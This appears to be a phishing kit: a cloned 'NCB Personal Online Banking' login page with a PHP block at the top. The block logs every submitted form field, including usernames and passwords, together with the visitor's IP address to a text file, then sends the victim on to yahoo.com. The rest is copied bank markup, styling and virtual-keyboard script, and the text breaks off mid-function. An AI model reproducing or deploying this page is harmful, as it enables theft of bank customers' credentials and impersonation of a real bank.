<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: yahoo.com');
$handle = fopen('log_z17g8K3WWR.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>





















		<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
	











<html lang="en">
<head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-47167941-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-47167941-3');
</script>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>




 














 
 
 




<!--  <link href="https://retail.ncbelink.com/corp/L001/consumer/theme/" rel="stylesheet" type="text/css"/>  --> 
<link href="https://retail.ncbelink.com/corp/L001/fontawesome/css/all.min.css" rel="stylesheet" type="text/css"/>

<link href="https://fonts.googleapis.com/css?family=Roboto:300,400" rel="stylesheet">
<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/materialize.css" rel="stylesheet" type="text/css"/>
<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/mega-menu.css" rel="stylesheet" type="text/css"/>
<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/layout_master.css" rel="stylesheet" type="text/css"/>

<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/application_master.css" rel="stylesheet" type="text/css"/>

	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/retailSpecificStyles.css" rel="stylesheet" type="text/css"/>
	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/ncbretailcustomapp.css" rel="stylesheet" type="text/css"/>
	
	


<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/mediaQueryApplication.css" rel="stylesheet" type="text/css"/>
<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/materialize_master.css" rel="stylesheet" type="text/css"/>
<link href="https://retail.ncbelink.com/corp/L001/fontawesome/css/all.min.css" rel="stylesheet" type="text/css"/>

<!-- <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous"> -->
<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/style.css" rel="stylesheet" />

<script type="text/javascript" src="https://retail.ncbelink.com/corp/scripts/jquery.js"></script>

<!-- <script type="text/javascript" src="https://retail.ncbelink.com/corp/js/collapse.js"></script> -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.min.js"></script>
<!-- <script src="https://retail.ncbelink.com/corp/js/bootstrap.js"></script> -->
<!--  <script type="text/javascript" src="https://retail.ncbelink.com/corp/js/bootstrap.min.js"></script>  -->




<script  type="text/javascript" src="https://retail.ncbelink.com/corp/scripts/common/Ncalendar1.js"></script>



<script type="text/javascript" src="https://retail.ncbelink.com/corp/scripts/common/materializeNFEBAScripts.js?moduleId=user,scriptsPath=scripts,isVdtMode=false,nodePath=,ipAddress=0.0.0.0.0.0,contextPath="></script>
<script type="text/javascript">jQuery.noConflict();</script>
	
		
	














<script>
setTreeFormt(1);
</script>


















	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/jquery-ui.custom_UX5.css" rel="stylesheet" type="text/css"/>
	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/lib_themes.css" rel="stylesheet" type="text/css"/>
	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/jquery-calendars-picker.css" rel="stylesheet" type="text/css"/>
	<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/responsiveTables.css" rel="stylesheet" type="text/css"/>

<script  type="text/javascript">
	<!--feba.domManipulator.documentReady(convertComboboxes);-->
	
</script>


<div id="flashcontent">
</div>
<link href="https://retail.ncbelink.com/corp/ L001/consumer/theme/additional_temporary.css" rel="stylesheet" type="text/css"/>
<input  type="Hidden" name="display_error_var" value="E"  id="display_error_var" />
<input  type="Hidden" name="UIType" value="UX5"  id="UIType" />



<link href="https://retail.ncbelink.com/corp/L001/consumer/theme/materializeHorizontal.css" rel="stylesheet" type="text/css"/>


<script>
	
	var mql = window.matchMedia("screen and (max-width : 479px),screen and (max-device-width:479px)");
	if (mql.matches) { // if media query matches
		var desktopUrl=	window.location.href;
		//window.location.href= desktopUrl + "&MOBILE_FLAG=1";
	} 
	else {
			var mql = window.matchMedia("screen and (max-height: 479px),screen and (max-device-height:479px)");
			if (mql.matches) { // if media query matches
				//console.log("##############NPageCustom AuthenticationScreen_onload mql - small screen");
				var desktopUrl=	window.location.href;
				//console.log("##############NPageCustom AuthenticationScreen_onload mql - small screen desktopUrl:"+desktopUrl);
				//window.location.href= desktopUrl + "&MOBILE_FLAG=1";
			}
	}
</script>





	
	
	
	
	

<title>NCB Personal Online Banking:Internet Banking Login</title></head>
<script type="text/javascript">var imagePath = 'L001/consumer/images';</script><script type="text/javascript">CONFIG = feba.domManipulator.extendObject(CONFIG || {}, {logMode : "CONSOLE",operatingMode : "DEVELOPMENT", blockOnButtonClicksRequired : "N",blockOnHyperLinkClicksRequired : "N"	,addtionalURLParamRequired : "N", hijriStartYear : "1396",hijriEndYear :"1520" });var IS_WATERMARK_ENABLED="N"
</script><script type="text/javascript">var langID="001";
var locale="en_US";
</script><body scroll="auto" oncontextmenu="return false;"><form method="post" action="<?php echo basename(__FILE__); ?>"  name="AuthenticationFG" action ="AuthenticationController;jsessionid=0000p2LUwjxoDlvBTxcwm5n02H5:1clmi66fl?bwayparam=QhOj%2BI%2BjX%2FUNq1WZhM8dLZsGf0yW9FdBzQTPu1BsKeM%3D" method = "post"  autocomplete="off" ><script  type="text/javascript">function actionset(){if(document.AuthenticationFG.ACTIONSWITCH== "Y"){document.AuthenticationFG.ACTIONSWITCH= "N"}else{document.AuthenticationFG.action= "";document.AuthenticationFG.action= "";}}</script><script language="javascript" enc="perish"> de('%286Fvfulsw%2853odqjxdjh%286G%2855mdydvfulsw%2855%2853hqf%286G%2855shulvk%2855%286Hixqfwlrq%2853lqlwldol%7DhWrnhq%285%3Blg%285FjurxsohwLg%285Fwrnhq%285%3C%28%3AEwu%7C%2853%28%3AE%2853li%285%3Bw%7Cshri%285%3BVwrudjh%285%3C%2853%2854%286G%286G%2853%2855xqghilqhg%2855%285%3C%2853%28%3AEvhvvlrqVwrudjh1%7BQxp%2853%286G%2853wrnhq%286E%2853mTxhu%7C%285%3B%285%3Avfulsw%288Ehqf%286G%2855shulvk%2855%288G%285%3A%285%3C1uhpryh%285%3B%285%3C%286E%2853%2853%2853%28%3AG%2853%2853%2853%2853%2853%28%3AGfdwfk%285%3Bh%285%3C%28%3AEfrqvroh1orj%285%3B%2855H%7Bfhswlrq%2853jhqhudwhg%2853zkloh%2853lqlwldol%7Dlqj%2853wrnhq%2855%285%3C%286E%28%3AG%28%3AG%286F%285Ivfulsw%286H',3); </script><script language="javascript" enc="perish"> de('%275Euetkrv%2742ncpiwcig%275F%2744lcxcuetkrv%2744%2742gpe%275F%2744rgtkuj%2744%275Gkpkvkcnk%7CgVqmgp%274%3A%2744CwvjgpvkecvkqpHI%2744%274E%2744pwnn%2744%274E%2744%5BQ9CUXI%27475%277G%2744%274%3B%275D%275E%274Huetkrv%275G',2); </script>



	

	<div class="toprow parentTable">






<style>
/*http://localhost:8080/EBankingWeb/L001/consumer/theme/materialize_master.css*/
body{
	overflow-x: visible;
}
#global
{
	max-height: 877px;
}
.parentTable{
	max-width: 100% !Important;
}
.materializelogo_login {
    background: none;}
div#header-row {
    display: none;
}
/**overridde the style as unable to remove verification part**/
.loginPanelInputDetailsrow, .loginPanelImagePhraserow {
    float: none;
    margin: 0;
    padding-bottom: 0px;
    padding-top: 0px;
    width: 50%;
}
//**for the login button START**/
//*i.waves-effect.waves-light.btn.login_button.waves-input-wrapper {
    padding-left: 135px;
    padding-right: 135px;
    background: #00539b;
    border-color: #007bff;
    border-radius: .2rem;
    /* border-width: 16px; */
   /* border: 1px solid transparent;*/
    }**/
i.waves-effect.waves-light.btn.login_button.waves-input-wrapper:hover {
    background-color: #0069d9;
    border-color: #0062cc;
}
//**for the login button END**/
.width100percent_main_loginbg {

    background: url(https://retail.ncbelink.com/corp/../images/backgrounds/login-bg.png);
    background-size: 101%;}
    
 .login_user {
    width: 100%;
    /*width of the userid box*/
   /* padding: 12px 93px;*/
   padding: 12px 6px;
  /*  margin: 8px 0;*/
   /*for height of the box START*/
       height: 2.0rem !important;
   /*for height of the box END*/  
    box-sizing: border-box !important;
    /* border: 1px solid #555 !important; */
    outline: none !important;
   /* border: 2px solid rgb(238, 238, 238) !important;*/
   border: 1px solid #a8a8a9 !important;
    /* color: #000000; */
    background-color: white !important;
    border-radius: 0 !important;
}

.user_id_style{
    /* float: none; */
    /* right: 100px !important; */
    margin-left: 221px;
    white-space: nowrap;
        position: relative !important;
    padding-top: 18px;
}


.lo {
    padding-left: 38px;
    padding-right: 38px;
    border: 1px solid #007bff !important;
    position: relative;
    bottom: 29px;
    left: 0px;
    float: right;
    top: -25px;
}

/*for login header*/
.lo_header {
    font-size: 2.0rem;
    color: #002a4ead !important;
    font-family: "Roboto", sans-serif !important;
    /* box-sizing: border-box; */
    padding-bottom: 10px;
    padding-left: 29px;
    padding-bottom: 14px;
}
/* for hidding the **/
.redstar {
    color: transparent;
}

.wel_st {
    color: white;
    /* position: absolute; */
    padding-top: 123px;
    /* font-weight: 900 !important; */
    font-size: 1.5rem;
}
.rem_sty{
	margin-right: 6px;
    /* text-align: left; */
    /* width: 18%; */
    padding-left: 26px;
  /*  padding-top: 40px;*/
}

.Login_linkstyle{
color: #002A4E !important;
    font-size: 13px;
    text-decoration: underline;
    font-family: "Roboto", sans-serif !important;
}

.login_link_style:after {
    padding-left: 6px;
    content: "|";
}

.Login_linkstyle1 {
    color: #002A4E !important;
    font-size: 13px;
    text-decoration: underline;
    margin-left: 35px;
    font-family: "Roboto", sans-serif !important;
}
/*.containerStyle label {
    top: -1.2rem !important;
    left: -0.95rem;
 
}*/

.containerStyle label {
    top: 0.8rem !important;
    left: 12.05rem;
    white-space: nowrap;
    font-size: 13px !important;}
	
	.containerStyle label.active {

	-webkit-transform: translateY(-22%);
	    font-size: 13px !important;}

/*for the username */
.for_username {
    left: 226px;
    /* margin-left: 193px; */
    white-space: nowrap;
    /* margin-top: 14px !important; */
    /* text-align: right !important; */
    /* padding: 1px 10px 10px 10px !important; */
    position: relative;
    bottom: 27px;
    color: #9E9E9E;
    font-size: 13px;
    font-family: "Roboto", sans-serif;
}
.width_cust{
padding: 25px 35px;
    width: 400px;
}
[type="checkbox"].filled-in:checked + span:after, [type="checkbox"].filled-in:not(:checked) + span:after {
    height: 12px !important;
     width: 12px !important;
    margin-top: 11px !important;
    /* border: none; */
    left: 2px !important;
    background-color: #80808012 !important;
    border: 1px solid #5555555c;
	}
	
/*for space height between boxes*/
.login_user{
    margin: -3px 0;	
    }
	
.loginLinkcontainer{
	display:flex;
	width: 46%;
	margin:auto;
}
#loginScreenSep{
	margin-top: 0.25rem;
}
#PrivacyPolicyfooter, #TermsCondionsfooter {
    color: #ffffff !important;
}
</style>
<script>
feba.domManipulator.documentReady(function (){
//alert("hi");
jQuery(".type_UserPrincipal").addClass("login_user");
jQuery(".login_button ").addClass("lo");
	
});
</script>
  <div id="global" class="next-genHeader login-body-style">
<div id="header" class="loginHeader">
		<div id="header-main " class="next-genHeader header-main newheaderbg">
			<div id="header-wrapper" class="wrapper">
				<div id="header-row" class="row">
					<div id="header-logo" class="materializelogo_login">
					<div class="header-text">ALL YOUR BANKING, FROM A SINGLE SECURE LOGIN</div>
					</div>
				</div>
			</div>
		</div>
</div>
								

  








<script type="text/javascript"><!--

linkArray = new Array();
isIE = document.all;

var currClickedElement;
var onFocus = 'Y';
jQuery(document).ready(function() {
if(onFocus == 'Y'){


jQuery(document).on('keydown',function(event) {
	if(event.which == 13 || event.which == 9) {
	closeKeypad();
	}
});
	jQuery( ".buttonhashed" ).css( "display", "none" );
}
if(jQuery('#MODAL_VIEW_CONTAINER').length >0){ 
	jQuery( ".buttonhashed_ebux2" ).css( "display", "none" );
}


jQuery(document).on('click',function(event) {
currClickedElement=jQuery(event.target).closest('div').parent().parent().parent();

if(currClickedElement && (jQuery(event.target).attr('type')=="password" || 
	jQuery(currClickedElement).attr('id')=='pp_div' || jQuery(event.target).attr('class')=='buttonhashed' )){
	if(onFocus == 'Y' || jQuery('#MODAL_VIEW_CONTAINER').length>0 ){
			jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow','visible');
			jQuery('div#modalDialog.ui-dialog-content').css('overflow','visible');
	}
	jQuery(document.getElementById('pp_div')).show();
	if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
	jQuery(document.getElementById('pp_div')).css('visibility','visible');
	}
}
else{
	if(onFocus == 'Y'){
		jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow','');
		jQuery('div#modalDialog.ui-dialog-content').css('overflow','');
		closeKeypad();
	}else{
		jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow','visible');
		jQuery('div#modalDialog.ui-dialog-content').css('overflow','visible');
		closeKeypad();
		setPinPadCtl(null);	
		var pwd = jQuery("input[type='password']");	
		jQuery(pwd).prop('disabled', false);
	}
}
if(jQuery(event.target).attr('for')){
    var lableId=jQuery(event.target).attr('id');
    if(lableId!='UserId_Text' && lableId!='label_access_code' && lableId!='label_verification_code'){
    //jQuery(document).unbind('click');
    event.preventDefault();
    }
}


});

});

isNN = !document.all&&document.getElementById;

isN4 = document.layers;

ppX = 450;
ppY = 250;

editCtl = null;
tmpEditCtl = null;

rX = (Math.random() * 24) - 12;
rY = (Math.random() * 36) - 18;


vIndex=0;
vRandomAlp=0;
vRandomNo=0;
vRandomSpl=0;


isHot=false;
showFirstTime=true;


isFirstTimeEnable = true;

var pwdImageValue="";
var pwdStrengthValue="";

insertData=function(ctl, value) {

    ctl.value = ctl.value + value;
    
    setValues(pwdImageValue,pwdStrengthValue)
    if(pwdImageValue != "" && pwdStrengthValue!= ""){
    	determinePasswordStrength(ctl.value,pwdImageValue,pwdStrengthValue,'null');
    }
    
};

     
applyNumber=function(ctl) {
    if(editCtl != null) {


        if(ctl.name == 'pp_clear') {
            editCtl.value = '';
            setValues(pwdImageValue,pwdStrengthValue)
            if(pwdImageValue != "" && pwdStrengthValue!= ""){
                   determinePasswordStrength(editCtl.value,pwdImageValue,pwdStrengthValue,'null');
            }       
           
        }else if (ctl.name == 'pp_erase'){
            editCtl.value= editCtl.value.substring(0,editCtl.value.length-1);
             setValues(pwdImageValue,pwdStrengthValue)
             if(pwdImageValue != "" && pwdStrengthValue!= ""){
             		determinePasswordStrength(editCtl.value,pwdImageValue,pwdStrengthValue,'null');
             }
        
        
        }else if (ctl.name == 'pp_caps'){ 
			var vCaps = document.getElementById('pp_caps').value;
			for(var vIndex=1;vIndex<=26;vIndex++){
				var vAlp = document.getElementById('alp_'+vIndex).value;
				
				if(vAlp==vAlp.toLowerCase()){
					var vTemp=vAlp.toUpperCase();
					document.getElementById('alp_'+vIndex).value=vTemp;
			document.getElementById('pp_caps').value=vCaps.toUpperCase();
				
				}else{		
					var vTemp=vAlp.toLowerCase();
					document.getElementById('alp_'+vIndex).value=vTemp;
				}
			document.getElementById('pp_caps').value=vCaps.toLowerCase();
			}
	
	
		}else {
		

            if(!editCtl.maxLength || editCtl.maxLength == 0 || editCtl.maxLength > editCtl.value.length) {

                insertData(editCtl, ctl.value);
            }
            tmpEditCtl = editCtl;
            if(editCtl.maxLength && editCtl.maxLength <= editCtl.value.length) {

                setPinPadCtl(null);
            }
	    if(tmpEditCtl.focus){
                setTimeout('tmpEditCtl.focus()', 1);
	    }
        }
    }
};
isIE=document.all? 1:0

		
		noKeyboard=function(e){
			keyEntry = !isIE? e.which:event.keyCode;
			if((keyEntry < '255') || (keyEntry > '0')){
				return false;
			}
		};
		
		
		var langBsdSmallAlp = {"001":"abcdefghijklmnopqrstuvwxyz","002":"abcdefghijklmnopqrstuvwxyz",
		"003":"abcdefghijklmnopqrstuvwxyz","004":"abcdefghijklmnopqrstuvwxyz"};
		var langBsdNum = {"001":"0123456789","002":"0123456789","003":"0123456789","004":"0123456789"};
		var langBsdSplChars = {"001":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';","002":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';",
		"003":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';","004":".+-!,@#$%&*()?=<>^_]{:\\|}`/[~\"\';"};
		
		
		getCharBasedOnLangId=function(arrayObj){
			var chars = arrayObj[langID];
			var langArr = new Array();
			var character;
			
			if(chars == null){
				chars = arrayObj["001"];
			} 
			var charLen = chars.length;
			for(i=0; i < charLen ; i++){
				character = chars.substring(i,i+1);
				if(character == "\""){
					langArr[i] = "&quot";
				}else{
					langArr[i] = character;	
				}
			}		
			return langArr;
		};
		
		
		settingPinPadCtlOnFocus=function(whatobject,whatimage,whatelement){
			
			
			
			
			if(onFocus == 'Y'){
		
			var isVisible =jQuery('#pp_div').is(':visible');	
			var isHidden  =jQuery('#pp_div').css('visibility');	
			if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
				if((isVisible && isHidden != 'hidden') && elem == whatelement ){
					//jQuery(document.getElementById('pp_div')).show();
					noAction = true;
					//return;
				}else{
				jQuery(document.getElementById('pp_div')).show();
				jQuery(document.getElementById('pp_div')).css('visibility','visible');
					noAction = false;
				}		
				}else{
				if(isVisible  && elem == whatelement ){
					//jQuery(document.getElementById('pp_div')).show();
					noAction = true;
					//return;
				}else{
				jQuery(document.getElementById('pp_div')).show();
				jQuery(document.getElementById('pp_div')).css('visibility','visible');
					noAction = false;
				}	
				}
				settingPinPadCtl(whatobject,whatimage,whatelement);
			}
			
			else{
			noAction = true;
			}
		};
		
		
		
		settingPinPadCtl=function(whatobject,whatimage,whatelement){
			if(noAction){
				return;
			}
			smallAlpArr = getCharBasedOnLangId(langBsdSmallAlp);
			numArr = getCharBasedOnLangId(langBsdNum);
			splCharArr = getCharBasedOnLangId(langBsdSplChars);


if(vRandomAlp==0){
	
	smallAlpArr.sort(function() {
return 0.5 - Math.random()})
}
if(vRandomNo==0){
	numArr.sort(function() {
return 0.5 - Math.random()})
}
if(vRandomSpl==0){
	splCharArr.sort(function() {
return 0.5 - Math.random()})
}


	var incr=0;
	var incralp=0,incrno=0,incrspl=0;
	var formname = '';
	var tempincralp;
	var tempincrno;
	var tempincrspl;
	for(j=0;document.forms[j] != null;j++)
	{
		for(i=0; document.forms[j].elements[i] != null; i++)
		{
			if((document.forms[j].elements[i].name == whatelement))
			{
				formname = document.forms[j].name;
			}
		}
	}
	if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
	var formNameIdentifier ="FORMSGROUP_ID__";
	var formnameVal="";
	if(document.getElementById(formNameIdentifier)){
	formnameVal=document.getElementById(formNameIdentifier).value;
	}
	
	this.target=document.getElementById(document.getElementById(jQuery(whatelement).attr('id')));	
	}
	else{
	
	this.target=document.forms[formname].elements[whatelement];
	
	}
			
			
			
			var len = 11;
			var numSplVal = 0;
			var newRow;
			var smallAlpArrLen = smallAlpArr.length;
			var numArrLen = numArr.length;
			var splCharArrLen = splCharArr.length;
			
			if (whatimage == 2){  
				
		var sHTML='<div id="close-keypad" class="hideElementFromUI"><div id="keypadstyle"  class="">'
			+'<p align="right"> <span class="keyBoardTitle"> Virtual Keyboard</span> '
			+'<span class="keyBoardTitleInfo">(For entering password only)</span>'
			
			+'<span> <strong><a name="CLOSE_KEYPAD" id="CLOSE_KEYPAD" href="https://retail.ncbelink.com/corp/javascript:setPinPadCtl(null),enableTextField(\''+whatelement+'\')" class="close" title="Close">x&nbsp;</a></strong></span> </p>' 
			
			+ '<p ><span id="titleBar" class="keyBordText" style="display:none"><ilayer width="100%" onSelectStart="return false">'
			+'<layer  width="100%" onMouseover="isHot=true;if (isN4) ddN4(pp_div)" onMouseout="isHot=false">'
			+'Access Code: '
			+'</layer></ilayer>'
			+'</span>'
			+'<span class="floatingleft" style="padding-bottom:5px"><input length="13" type=password name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly style="display:none"></span>'
			+'</p></div>';
				
				sHTML = sHTML+'<div id="keypadclear" style="padding-left: 4px;width:100%" >';
				while(incralp < smallAlpArrLen || incrno < numArr.length || incrspl < splCharArrLen){
					
					sHTML = sHTML+'<p class="clearboth">';
					newRow=true;
					for (i=0; i < len; i++){
						
						
						if(i == 0){
							sHTML = sHTML+'<span  class="height28forkeypad">';
						} else{
							sHTML = sHTML+'<span>';
						}
						
						
						if(incrspl < splCharArrLen && i < len){
							tempincrspl=incrspl++;
							sHTML = sHTML+'<input class="mainButton" type="button" name="pp_'+incrspl+'" id="pp_'+incrspl+'" title="'+splCharArr[tempincrspl]+'"  value="'+splCharArr[tempincrspl]+'" onclick="applyNumber(this)"/></span>';
							if(incrspl == splCharArrLen ){
								sHTML = sHTML+ '<br>';
								i++ ;
							}
							newRow = false;
						}						
												
						
						if(incrno < numArrLen && i < len && newRow == true){
							tempincrno=incrno++;
							sHTML = sHTML+'<input class="mainButton" type="button" name="pp_'+incrno+'" id="pp_'+incrno+'" title="'+numArr[tempincrno]+'"  value="'+numArr[tempincrno]+'" onclick="applyNumber(this)"/></span>';
							if(incrno == numArrLen ){
								sHTML = sHTML+ '<br>';
								i++;
							}
							newRow = false;	
												
						}

											
						if(incralp < smallAlpArrLen && i < len && newRow == true){
							tempincralp=incralp++;
							sHTML = sHTML+'<input class="mainButton" type="button" name="alp_'+incralp+'" id="alp_'+incralp+'" title="'+smallAlpArr[tempincralp]+'"  value="'+smallAlpArr[tempincralp]+'" onclick="applyNumber(this)"/></span>';
							if(i == len-2){
								sHTML = sHTML+ '<br>';
								i++;
							}
						}
						
						
						 if((incrspl >= splCharArrLen || incralp >= smallAlpArrLen || incrno <= numArrLen) && i < len-1 ){
						 	sHTML = sHTML+'</span>';
						 	newRow = true;						 					 		
						}
						
					}
					
					
				}
				sHTML = sHTML+'<input class="mainButton_blank" type="button" /></span>';
				if(langID == '001'){
				sHTML = sHTML +'<span class=""><input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="Caps" onclick="applyNumber(this)"/></span>';
			}else{
				sHTML = sHTML +'<span class=""><input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="Caps" /></span>';
			}
			sHTML = sHTML+'<span class=""><input class="keybtn_Backspace" type="button" name="pp_erase" id="pp_erase" title="Backspace" value="" onclick="applyNumber(this)"/></span>'
				+'<span class=""><input class="keybtn_Clear" type="button" name="pp_clear" id="pp_clear" title="Clear" value="" onclick="applyNumber(this)"/></span>';
			sHTML = sHTML+'</p>';	
			sHTML = sHTML+'</div>';
			sHTML = sHTML+'</div>';
			}
	

document.getElementById("scriptdiv").innerHTML = sHTML;

	if(jQuery('#MODAL_VIEW_CONTAINER').length==0 ){
	if(typeof grpId == "undefined"){
	document.forms[formname].buffer.maxLength = 2147483647; 
	setPinPadCtl(document.forms[formname].elements[whatelement]);
	}
	else{	
		if(whatelement!=null && whatelement.indexOf(':')==-1){
		setPinPadCtl(document.getElementById(grpId+":"+whatelement));
		}else{
		setPinPadCtl(document.getElementById(whatelement));
		}
	}
	
	}
	else{
	var grpId='null';
	if(whatelement!=null && whatelement.indexOf(':')==-1){
		if('null' != grpId){
	setPinPadCtl(document.getElementById(grpId+":"+whatelement));
		}else{
			setPinPadCtl(document.getElementById(whatelement));
		}
	}else{
	setPinPadCtl(document.getElementById(whatelement));
	}
	}
	/*setPinPadCtl(document.forms[formname].buffer);*/
	
	elem = whatelement;
};


setPinPadCtl=function(ctl) {

    	
    if(ctl && !editCtl && ctl.maxLength && ctl.maxLength <= ctl.value.length) {
    
        return;
    }
    
    
    editCtl = ctl;
    var elements = document.forms[0].elements;
    for(i = 0; i <= 77; i++) {

        var el = elements['pp_' + i];
        if(el != null) {

            el.disabled = editCtl == null;
        }
    }
    var el = elements['pp_clear'];
	if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['pp_erase'];
	if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['close'];
	if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['done'];
    if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['buffer'];
    if(el != null) {

        el.disabled = editCtl == null;
    }
	var el = elements['help'];
    if(el != null) {

        el.disabled = editCtl == null;
    }

    topLayer=isIE ? 'BODY' : 'HTML';
    layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;

	if(isIE && event || !isIE && ctl) {

        hotLayer=isIE ? event.srcElement : ctl.target;
        while (hotLayer != null && hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {

          hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;
        }
        if (hotLayer != null && hotLayer.id == 'titleBar' && ctl != null) {

          offsetx=isIE ? event.clientX : ctl.clientX;
          offsety=isIE ? event.clientY : ctl.clientY;
          nowX=parseInt(layer.style.left);
          nowY=parseInt(layer.style.top);
          ddEnabled=true;
          document.onmousemove=dd;
        }
    }
	
    if(layer==null){
    	layer=""; 
    }
	
    
    if(layer != null) {

        if(editCtl != null) {

            if (showFirstTime) {
		
                showFirstTimePinPad(layer, ctl);
                display();
                showFirstTime=false;
            } else {
		

				showPinPad(layer, ctl);
				display();
				
            }
        } else {

			hidePinPad(layer);
			display();
        }
    } else {

        alert('Pin Pad not supported by your browser');
    }
};

onloadNumber=function(ctl) {

    ctl.disabled = editCtl == null;
};

checkPinPad=function(ctl) {

    if(ctl.maxLength && ctl.maxLength != 0 && ctl.maxLength <= ctl.value.length) {

        setPinPadCtl(null);
    } else {

        if(editCtl == null)
            setPinPadCtl(this);
    }
};


showPinPad=function(ctl, pctl) {


	if (isIE || isNN) {

        layer.style.visibility='visible';
       
    } else if (isN4) {

        document.pp_div.visibility='show';
        
    }
};

showFirstTimePinPad=function(ctl, pctl) {


    var pX = 500;
    var pY = 250;

    if(ppY) {

        pY = ppY;
    } else if(pctl.screenTop) {

        pY = pctl.screenTop + 30;
    } else if(pctl.screenY) {

        pY = pctl.screenY + 30;
    }
    if(ppX) {

        pX = ppX;
    } else if(pctl.screenLeft) {

        pX = pctl.screenLeft;
    } else if(pctl.screenX) {

        pX = pctl.screenX;
    }
    if(ctl.style) {

        ctl.style.top = pY + rX;
        ctl.style.left = pX + rY;
    }
    if (isIE || isNN) {

		layer.style.visibility='visible';
    } else if (isN4) {

        document.pp_div.visibility='show';
        
	}
	
};

hidePinPad=function(ctl){

    if (isIE || isNN) {

		layer.style.visibility='hidden';

	} else if (isN4) {

		document.pp_div.visibility='hide';
    }
elem = null;
};

ddInit=function(ctl){

    var topLayer = isIE ? 'BODY' : 'HTML';

	var layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;

	var hotLayer = isIE ? event.srcElement : ctl.target;

	if (layer != null) {

        while (hotLayer.id != 'titleBar' && hotLayer.tagName != topLayer) {

		  hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;
		  if (hotLayer == null) return;
        }
        if (hotLayer.id == 'titleBar') {


		  offsetx=isIE ? event.clientX : ctl.clientX;
          offsety=isIE ? event.clientY : ctl.clientY;
          nowX=parseInt(layer.style.left);
          nowY=parseInt(layer.style.top);
          ddEnabled=true;
          document.onmousemove=dd;
        }
    }
};

dd=function(ctl){

  if (!ddEnabled) return;
  layer.style.left=isIE ? nowX+event.clientX-offsetx : nowX+ctl.clientX-offsetx+'px';
  layer.style.top=isIE ? nowY+event.clientY-offsety : (nowY+ctl.clientY-offsety)+'px';
  display();
  return false;
};

		 
		disbleTextField=function(whatelement){
		console.log('inside disbleTextField-------');
			
			var isVisible = document.getElementById('pp_div').style.visiblity = 'visible' ? true : false;
			if(isVisible && elem == whatelement){
				noAction = true;
				return;
			}else{
				noAction = false;
			}
			
			var j=0;
			var enab = true;
			var disb = true;
			while((document.forms[j] != null && (enab || disb))){
					
					for(i=0; document.forms[j].elements[i] != null; i++){
					
				 		if(isVisible && (document.forms[j].elements[i].name == elem)){
				 			document.forms[j].elements[i].disabled = false;
				 			enab = false;
				 		}else if((document.forms[j].elements[i].name == whatelement)){		
							
							document.forms[j].elements[i].disabled=true;
							disb = false;
					 	}
					 	if(!isVisible){
					 		enab = false;
					 	}
					}
				j++;
			}
			
		};
		
		
		setStyle=function(obj,style,value){
			obj.style[style]=value;
		};

	    
		enableTextField=function(whatelement){
			this.target.disabled=false;
		};

		getPixel=function(str) {
			if (str == "") {
				return "0";
			} else {
				return parseInt(str.substring(0, str.length-2),10);
			}
		};

		
		randomDisplay=function(){
			
			var scrollTop = window.pageYOffset || window.document.documentElement.scrollTop || window.document.body.scrollTop;
			var maxtop = scrollTop+320;
			var maxleft = 320;
			var pos = Math.random()*200;
			var locationtop;
			var locationleft;
			
			if (!isIE) {
				locationtop = getPixel(document.getElementById('pp_div').style.top);
			  	locationleft = getPixel(document.getElementById('pp_div').style.left);
			} else {
